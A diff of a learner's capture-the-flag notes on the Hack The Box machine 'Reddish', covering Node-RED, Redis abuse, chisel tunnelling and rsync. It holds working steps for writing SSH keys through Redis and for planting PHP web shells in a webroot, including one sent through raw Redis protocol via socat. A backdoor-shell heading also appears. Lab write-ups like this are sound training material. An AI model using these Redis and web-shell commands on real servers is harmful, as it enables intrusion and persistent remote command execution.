@@ -31,6 +31,7 @@ Learnt:
 16. Xargs revision
 17. Intro to rsync
 18. Exclaridraw is a free solution to mapping out a network visually which is better than the alternative of working with abstract addressing tables
+19. Chisel Chaining thourhg multiple machines
  
 Beyond Root:
 - Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
@@ -63,7 +64,7 @@ This is such a weird request to me. We get back HTTP/2 of all things.
 To get the About.html, grepping for `red`
 ![](greppingtheabout.png)`
 
-Reveal node-red...
+Reveals node-red...
 
 I still think the favicon is cooler, but I a happy that I am improving my searching or dorking ability somewhat as I have be worrying I am too meticulious or no where near enough to get anywhere. **BUT** I would have notice the key, but not found it.. I know 
 ![posting](ippsecposts.png)
@@ -74,6 +75,8 @@ Day 4: After some practice elsewhere
 Day 5-7: `c811816e50d58bd34204067b8ba3ae80`
 Day 8-10: `13492c3c28a60b2a4a00971f3c9a6629`
 Day 11: `7de1d67778f7702daab47daa9ff58d1d`
+Day 12: ??
+Day 13: to far gone
 
 As of Day 5-8; I have learn so much as to why my approaches were good
 1. Manual combing the with burp site and asking questions is really good
@@ -391,9 +394,18 @@ For hits to be reflected on the page we both the web app, the database and the `
 
 Following along with Ippsec or the article
 ```bash
-$ redis-cli -h 192.168.1.11 flushall$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackitLooks good. How to dump our memory content into the authorized_keys file? That’skinda trivial.
-
-$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir1) "dir"2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys"OK192.168.1.11:6379> saveOK
+$ redis-cli -h 192.168.1.11 flushall$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+# Looks good. How to dump our memory content into the authorized_keys file? That’skinda trivial.
+$ redis-cli -h 192.168.1.11
+192.168.1.11:6379> config set dir /Users/antirez/.ssh/
+OK
+192.168.1.11:6379> config get di
+1) "dir"
+2) "/Users/antirez/.ssh"
+3) 192.168.1.11:6379> config set dbfilename "authorized_keys"
+4) OK
+5) 192.168.1.11:6379> save
+6) OK
 ```
 
 WE need to use [FLUSHALL](https://redis.io/commands/flushall/)
@@ -471,7 +483,6 @@ redis-cli -h 127.0.0.1 -x set subscribetoippsecand0xdf "<? system($_REQUEST['cmd
 redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
 redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
 redis-cli -h 127.0.0.1 save
-exit
 ```
 2. And try
 ```bash
@@ -514,20 +525,26 @@ Fixed the RCE -
 ```bash
 # 0xDF 
 # cmd.php:
+
+
+
+
  <? system($_REQUEST['cmd']); ?>
+
+
+
+
 # 0xdfreddishRCE.sh
 #!/bin/bash
 
 # https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
 redis-cli -h 127.0.0.1 flushall
-#  -h 127.0.0.1  had this below :/
-cat cmd.php | redis-cli -x set subscribetoippsecandreaddf
+cat cmd.php | redis-cli -x set subscribetoippsecandread0xdf
 redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
-redis-cli -h 127.0.0.1 config set dbfilename "nvm.php"
+redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
 redis-cli -h 127.0.0.1 save
-exit
 ```
-Although not something I tried I did check how else it could have been done; [alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www) prefers *to talk raw Redis. Have a look here [https://www.compose.com/articles/how-to-talk-raw-redis/](https://www.compose.com/articles/how-to-talk-raw-redis/) and here [https://redis.io/topics/protocol](https://redis.io/topics/protocol). So, basically, we can do something like this:
+Although not something I tried I did check how else it could have been done; [alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www) prefers *to talk raw Redis. Have a look here [https://www.compose.com/articles/how-to-talk-raw-redis/](https://www.compose.com/articles/how-to-talk-raw-redis/) and here [https://redis.io/topics/protocol](https://redis.io/topics/protocol). So, basically, we can do something like this:*
 ```bash
 echo -ne '*1\r\n$8\r\nFLUSHALL\r\n*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n<?php shell_exec($_GET["e"]); ?>\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$5\r\nz.php\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$46\r\n/var/www/html/8924d0549008565c554f8128cd11fda4\r\n*1\r\n$4\r\nSAVE\r\n' | /tmp/socat - TCP:redis:6379
 ```
@@ -570,7 +587,7 @@ There is not much in term of files of these users or trace as neither are in /et
 
 ![](ipaweareinno4.png)
 
-## PrivEsc 
+## www - backup - reddish
 
 Backup directory is the only thing that stands out in the filesystem
 ![](backupstandsout.png)
@@ -747,7 +764,7 @@ Considering VPN ip continous changes I added to all new  `*-CMD-by-CMDs.md`
 sed -i 's/$oldip/$newip/g' *-CMD-by-CMDs.md
 ```
 
-Also upgraded data colleciton options for network sweeping and port scanning - [[4]]. Then upgraded my mkCTFdir script and [[4]] again.
+Also upgraded data colleciton options for network sweeping and port scanning - [[Reddish-Notes]]. Then upgraded my mkCTFdir script and [[Reddish-Notes]] again.
 
 I then released after all that I needed `--key`! Never again..
 
@@ -787,7 +804,7 @@ rsync rsync://backup:873/src/etc/cron.d/
 
 ```
 
-Checked [Ippsec Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=3615s) after both attempts failed
+Checked [Ippsec Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=3615s) after both attempts failed.
 
 I only had one thing wrong! - I thought that the endpoint would always be the server but with the chain of tunnels it can be the client
 ```bash
@@ -892,10 +909,10 @@ find . -type f -name "*.*onf*" | xargs grep -ie 'passw'
 [Inspiration for the Find,Xargs,grep example](https://phoenixnap.com/kb/xargs-command)
 
 
-#### Omni-Tooling - Port Redirection
+#### Omni-Tooling - Port Redirection and Pivoting through a network
 https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
-- sshuttle
+- sshhuttle - read into this but inital issues are python and installation method so...
 - ssh
 	- 0xDF instuction 2.  Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.
 
@@ -904,69 +921,23 @@ Back to Reddish
 - `meterpreter portfwd` with  0xDF instructions:
 1.  Get a meterpreter session with nodered, and use the `portfwd` capability to tunnel from my local box into the network (like ssh tunneling).
 
-#### Omni-Tooling - Pivoting through a network
 
 We do not have access to some parts of this box
 [0xdf uses SOCAT](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#www--redis-containers) 
 
-
+I played around with `meterpreter` and lost interest. Also I want write make changes to ninjashell and go full cyber
 
 #### Use Node RED to understand Virtual networking 
 
-3.  Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.
-
 https://nodered.org/docs/user-guide/
 
-1. Highest possible goal is a proxy
+Highest possible goal: Build a listening interface (likely web) with NodeRed, and use that to tunnel or  proxy
+
+![1080](easyhttp.png)
 
 [How to build a tcp proxy](https://robertheaton.com/2018/08/31/how-to-build-a-tcp-proxy-1/)
-```goat
-[kali] <-> [nodered] -> [X]
-	 <- [proxy back] <- 
-	 -> [tell nodered to goto [x] ->  
-```
 
-
-- ListenToKali
-- ReplyToKali - incorrect cmd or cmd and proxied response
-
-- Recieve-CMD-ServerLogic - incorrect cmd or attempt cmd
-
-- ProxyOutBound with correct cmd
-- ProxyInbound - recieve information back from cmd ran
-
-- Proxy-Back-ServerLogic handle and return to ReplyToKali
-
-```bash
-# Kali - cmd input
-ncat -nv $ip 9000
-<cmd>
-# Listener to recieve 
-ncat -lvnp 9001
-```
-
-function block, switch per field: cmd, ip, port
-```goat
-exec (payload)->  Switch -> 
-					| 
-				return invalid command payload
-
-tcp-request - set with msg.host, msg.port
-```
-
-
-#### Add videos to Helped-Through 
-
-And quick bash script to go back add the video to each as a iframe
-```bash
-
-YOUTUBEVIDID=
-# 
-echo ""
-<iframe width="560" height="315" src="https://www.youtube.com/embed/$YOUTUBEVIDID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-
-```
-
+Add videos to helpthroughs seem like a destructive waste of time and potential retroactively added them is only good rerun boxes.
 
 #### Go HTTPS server + BackdoorShell = Easy Way Back In
 
